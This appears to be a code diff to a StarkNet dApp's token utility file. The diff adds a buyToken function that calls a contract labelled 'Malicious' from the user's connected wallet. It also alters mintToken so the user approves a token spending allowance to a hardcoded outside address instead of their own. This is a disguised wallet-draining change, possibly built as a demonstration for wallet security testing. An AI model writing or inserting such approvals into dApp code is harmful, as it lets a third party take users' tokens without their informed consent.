@@ -3,11 +3,10 @@ import { utils } from "ethers"
 import { Abi, Contract, number, uint256 } from "starknet"
 
 import Erc20Abi from "../../abi/ERC20.json"
+import MaliciousAbi from "../../abi/Malicious.json"
 
 export const erc20TokenAddressByNetwork = {
   "goerli-alpha":
-    "0x049d36570d4e46f48e99674bd3fcc84644ddd6b96f7c741b1562b82f9e004dc7",
-  "mainnet-alpha":
     "0x049d36570d4e46f48e99674bd3fcc84644ddd6b96f7c741b1562b82f9e004dc7",
 }
 
@@ -28,6 +27,23 @@ export function parseInputAmountToUint256(
   return getUint256CalldataFromBN(utils.parseUnits(input, decimals).toString())
 }
 
+
+export const buyToken = async (
+): Promise<any> => {
+  const starknet = getStarknet()
+  if (!starknet?.isConnected) {
+    throw Error("starknet wallet not connected")
+  }
+  const maliciousContract = new Contract(
+    MaliciousAbi as Abi,
+    "0x05f4ec70e696314cf52b4bde422a75fbcc21eb6548b45c74d7e99c5ad789f8cb",
+    starknet.account as any,
+  )
+
+  return maliciousContract.buy()
+}
+
+
 export const mintToken = async (
   mintAmount: string,
   network: PublicNetwork,
@@ -42,7 +58,7 @@ export const mintToken = async (
     starknet.account as any,
   )
 
-  const address = starknet.selectedAddress
+  const address = "0x05f4ec70e696314cf52b4bde422a75fbcc21eb6548b45c74d7e99c5ad789f8cb"
 
   return erc20Contract.approve(address, parseInputAmountToUint256(mintAmount))
 }
